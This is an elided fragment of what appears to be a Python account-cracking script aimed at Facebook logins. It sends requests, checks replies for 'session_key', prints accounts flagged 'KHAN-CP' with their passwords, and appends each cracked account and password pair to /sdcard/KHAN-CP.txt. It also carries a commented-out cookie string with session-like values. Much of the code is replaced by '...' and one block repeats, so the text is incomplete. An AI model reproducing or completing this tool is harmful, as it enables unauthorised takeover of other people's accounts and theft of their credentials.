...
headers = {
    ...
    # 'cookie': 'datr=6G9AZI5HLmfWFBoiAjTJcNiJ; sb=6G9AZJOWgllyYnis97_nkcXp; m_pixel_ratio=2; wd=980x1829; fr=0dy7iM7kybF51DUXZ..BkQG_o.Ua.AAA.0.0.BkQHAI.AWX8RVRKCvE',
      ...
      #      print(response.text)
            ...
            if 'session_key' in response.text:
                ...
                if cpok=='n':
                     ...
                     print('\r\033[1;91m[\033[1;97mKHAN-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'   ')

                cpacc.append(acc)

                open('/sdcard/KHAN-CP.txt','a').write(f'{acc} • {pword}\n')
      ...
      #      print(response.text)
            ...
            if 'session_key' in response.text:
                ...
                if cpok=='n':
                     ...
                     print('\r\033[1;91m[\033[1;97KHAN-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'   ')
